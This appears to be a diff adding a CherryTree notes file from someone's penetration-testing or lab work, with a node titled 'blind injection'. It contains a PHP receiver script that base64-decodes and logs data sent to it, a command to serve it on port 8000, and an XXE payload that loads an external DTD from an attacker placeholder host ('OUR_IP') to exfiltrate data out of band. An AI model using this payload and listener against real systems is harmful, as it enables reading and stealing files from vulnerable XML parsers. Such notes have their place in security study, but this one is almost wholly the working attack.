@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="55" master_id="0" name="blind injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747988587" ts_lastsave="1747990120">
+    <rich_text>
+
+
+
+
+
+[ip][name][state][location]</rich_text>
+    <codebox char_offset="0" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+    <codebox char_offset="1" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="php" highlight_brackets="1" show_line_numbers="0">&lt;?php&#13;
+if(isset($_GET['content'])){&#13;
+    error_log("\n\n" . base64_decode($_GET['content']));&#13;
+}&#13;
+?&gt;
+
+vi index.php
+php -S 0.0.0.0:8000</codebox>
+    <codebox char_offset="4" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="xml" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&#13;
+&lt;!DOCTYPE email [ &#13;
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;&#13;
+  %remote;&#13;
+  %oob;&#13;
+]&gt;</codebox>
+  </node>
+</cherrytree>
